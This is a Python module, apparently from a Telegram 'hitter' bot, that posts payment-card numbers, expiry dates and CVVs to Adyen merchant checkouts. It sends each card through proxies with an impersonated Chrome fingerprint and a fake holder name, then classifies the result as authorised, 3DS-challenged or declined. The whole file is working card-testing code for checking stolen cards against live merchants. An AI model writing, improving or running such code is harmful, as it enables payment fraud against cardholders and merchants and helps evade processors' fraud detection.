"""
Adyen Dedicated Hitter Module (gokuhitter_bot)
Completely isolated from Stripe logic (hitter_core.py is untouched).
Handles /hitad command for Adyen merchant checkouts and API endpoints.
"""

import time
import json
import random
import string
import asyncio
import re
from typing import Dict, Optional, List
from curl_compat import ChromeSession


class AdyenAPIHitter:
    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith("http://") and not self.url.startswith("https://"):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data

    async def hit(self, card: Dict, attempt: int, user_id: int) -> Dict:
        start = time.time()
        result = {
            'attempt': attempt,
            'card': card,
            'success': False,
            'decline_code': None,
            'response_time': 0,
            'amount': None,
            'merchant': 'Adyen Merchant',
            'proxy_raw': None,
            'error': None,
            'raw_response': None
        }

        proxies = None
        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')
            auth = f"{self.proxy_data['username']}:{self.proxy_data['password']}@" if 'username' in self.proxy_data else ""
            proxy_url = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            proxies = {"http": proxy_url, "https": proxy_url}

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Origin": self.url,
            "Referer": self.url
        }

        try:
            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=15) as session:
                # Pre-flight page fetch to extract merchant info or CSRF tokens if available
                merchant_name = "Adyen Merchant"
                try:
                    async with session.get(self.url, timeout=10) as page_res:
                        html = page_res.text
                        m_match = re.search(r'<title>([^<]+)</title>', html, re.IGNORECASE)
                        if m_match:
                            merchant_name = m_match.group(1).split('|')[0].strip()[:30]
                except Exception:
                    pass

                result['merchant'] = merchant_name

                exp_year_full = card['year'] if len(card['year']) == 4 else f"20{card['year']}"

                pay_payload = {
                    "paymentMethod": {
                        "type": "scheme",
                        "number": card['card'],
                        "expiryMonth": card['month'].zfill(2),
                        "expiryYear": exp_year_full,
                        "cvc": card['cvv'],
                        "holderName": "John Smith"
                    },
                    "amount": {
                        "currency": "USD",
                        "value": 1000
                    },
                    "reference": f"ref_{random.randint(100000, 999999)}",
                    "returnUrl": self.url,
                    "browserInfo": {
                        "acceptHeader": "*/*",
                        "colorDepth": 24,
                        "language": "en-US",
                        "javaEnabled": False,
                        "screenHeight": 1080,
                        "screenWidth": 1920,
                        "timeZoneOffset": -300,
                        "userAgent": headers["User-Agent"]
                    }
                }

                async with session.post(self.url, json=pay_payload, headers=headers, timeout=15) as res:
                    result['response_time'] = round(time.time() - start, 2)
                    try:
                        res_json = res.json()
                    except Exception:
                        res_json = {"status_code": res.status, "text": res.text()[:200]}

                    result['raw_response'] = res_json

                    result_code = None
                    if isinstance(res_json, dict):
                        result_code = res_json.get("resultCode") or res_json.get("status") or res_json.get("result_code")

                    if result_code in ["Authorised", "Received", "Pending", "succeeded"]:
                        result['success'] = True
                        if isinstance(res_json, dict) and res_json.get("pspReference"):
                            result['receipt_url'] = f"https://ca-live.adyen.com/ca/ca/accounts/showTx.shtml?pspReference={res_json['pspReference']}"
                        return result
                    elif result_code in ["RedirectShopper", "IdentifyShopper", "ChallengeShopper"]:
                        result['decline_code'] = '3ds_required'
                        result['error'] = 'Adyen 3DS Challenge Required'
                        return result
                    elif isinstance(res_json, dict) and "refusalReason" in res_json:
                        refusal = res_json.get("refusalReason")
                        result['decline_code'] = refusal.lower().replace(" ", "_") if refusal else "refused"
                        result['error'] = refusal or "Payment Refused"
                        return result
                    elif isinstance(res_json, dict) and ("error" in res_json or "message" in res_json):
                        err = res_json.get("error") or res_json.get("message")
                        if isinstance(err, dict):
                            err_msg = err.get("message") or err.get("code") or "Error"
                        else:
                            err_msg = str(err)
                        result['decline_code'] = err_msg.lower().replace(" ", "_")[:30]
                        result['error'] = err_msg
                        return result
                    else:
                        result['decline_code'] = str(result_code or 'refused').lower()
                        result['error'] = f"Adyen status: {result_code or 'Refused'}"
                        return result

        except Exception as ex:
            result['response_time'] = round(time.time() - start, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result
